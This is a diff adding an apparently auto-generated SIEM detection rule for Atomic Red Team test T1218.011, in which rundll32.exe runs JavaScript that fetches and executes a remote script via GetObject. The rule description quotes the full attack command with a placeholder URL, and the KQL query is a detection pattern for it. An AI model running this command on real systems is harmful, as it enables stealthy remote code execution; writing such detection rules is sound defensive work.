@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Rundll32 execute JavaScript Remote Payload With GetObject' (GUID: 57ba4ce9-ee7a-4f27-9928-3c70c489b59d) of technique T1218.011 (Signed Binary Proxy Execution: Rundll32). Test Description: Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed.. Command/Steps: rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:#{file_url}\\\").Exec();window.close();\n"
+from = "now-9m"
+rule_id = "b90c84c6-57fa-4d97-a09e-8ec8eb89a33c"
+language = "kql"
+name = "Atomic Test: T1218.011 - Rundll32 execute JavaScript Remote Payload With GetObject"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1218.011/T1218.011.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1218.011", "57ba4ce9-ee7a-4f27-9928-3c70c489b59d", "windows",]
+type = "query"
+query = "(process.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\") OR process.parent.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\")) AND process.command_line : \\\"*rundll32.exe*\\\" AND process.command_line : \\\"*javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1218.011"
+name = "Rundll32 execute JavaScript Remote Payload With GetObject"
+reference = "https://attack.mitre.org/techniques/T1218/011"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1218/011"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1218/011"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1218/011"
+
+
